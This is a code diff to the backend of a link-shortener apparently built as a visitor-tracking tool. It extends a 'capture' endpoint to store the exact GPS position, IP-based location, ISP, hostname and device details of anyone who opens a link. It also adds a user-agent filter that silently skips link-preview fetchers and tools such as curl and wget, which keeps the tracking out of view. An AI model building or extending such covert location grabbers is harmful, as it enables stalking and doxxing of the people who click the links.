@@ -100,8 +100,7 @@ router.post("/shorten", async (req, res) => {
 });
 
 // POST /api/links/capture
-// Body: { token, referrer, screenWidth, screenHeight, language, platform }
-// Server-side: gets IP, country, ISP, hostname, browser, OS from UA
+// Body: { token, referrer, screenWidth, screenHeight, language, platform, gpsLat, gpsLon, gpsAccuracy }
 router.post("/capture", async (req, res) => {
     try {
         const {
@@ -111,25 +110,44 @@ router.post("/capture", async (req, res) => {
             screenHeight,
             language,
             platform,
+            gpsLat,
+            gpsLon,
+            gpsAccuracy,
         } = req.body;
 
         if (!token) return res.status(400).json({ error: "token is required" });
 
         const ua = req.headers["user-agent"] || "";
+
+        // ── Bot / crawler filter ──────────────────────────────────
+        // WhatsApp, Telegram, Slack, Google, Facebook etc. auto-fetch links
+        // for link previews. We silently ignore these — they are NOT real visits.
+        const BOT_PATTERNS = /bot|crawl|spider|preview|slurp|facebookexternalhit|whatsapp|telegram|slack|discord|curl|wget|python|java|go-http|axios|node-fetch|undici/i;
+        if (BOT_PATTERNS.test(ua)) {
+            // Return success so the caller doesn't retry, but don't record anything
+            return res.status(200).json({ found: true, destinationUrl: null });
+        }
+
+        // Also reject captures with no screen data — bots don't have screens
+        if (!screenWidth && !gpsLat) {
+            const looksLikeBot = !ua || ua.length < 40;
+            if (looksLikeBot) {
+                return res.status(200).json({ found: true, destinationUrl: null });
+            }
+        }
+        // ─────────────────────────────────────────────────────────
+
         const ip = getClientIP(req);
 
         // Enrich IP on backend (country, ISP, hostname, city, lat/lon)
         const ipData = await enrichIP(ip);
 
-        // Build the full capture record — all fields from the UI image
+        // Build the full capture record
         const deviceData = {
-            // Date/Time
             capturedAt: new Date().toISOString(),
-
-            // IP Address
             ip,
 
-            // Country + Location
+            // Country + Location (IP-based, approximate)
             country: ipData.country || null,
             countryCode: ipData.countryCode || null,
             region: ipData.region || null,
@@ -138,33 +156,24 @@ router.post("/capture", async (req, res) => {
             lat: ipData.lat || null,
             lon: ipData.lon || null,
 
+            // GPS (exact — only present if user allowed browser location)
+            gpsLat: gpsLat || null,
+            gpsLon: gpsLon || null,
+            gpsAccuracy: gpsAccuracy || null,
+
             // Browser
             browser: parseBrowser(ua),
-
-            // Operating System
             os: parseOS(ua),
-
-            // Device type
             device: parseDevice(ua),
-
-            // User Agent (full string)
             userAgent: ua,
 
-            // Referring URL
             referrer: referrer || null,
-
-            // Host Name (reverse DNS from IP lookup)
             hostname: ipData.hostname || null,
-
-            // ISP
             isp: ipData.isp || null,
             org: ipData.org || null,
             asn: ipData.asn || null,
-
-            // Timezone
             timezone: ipData.timezone || null,
 
-            // Browser extras (sent from client)
             screenWidth: screenWidth || null,
             screenHeight: screenHeight || null,
             language: language || null,
@@ -178,6 +187,7 @@ router.post("/capture", async (req, res) => {
         return res.status(500).json({ error: "Failed to record capture" });
     }
 });
+
 
 // POST /api/links/credits
 router.post("/credits", async (req, res) => {
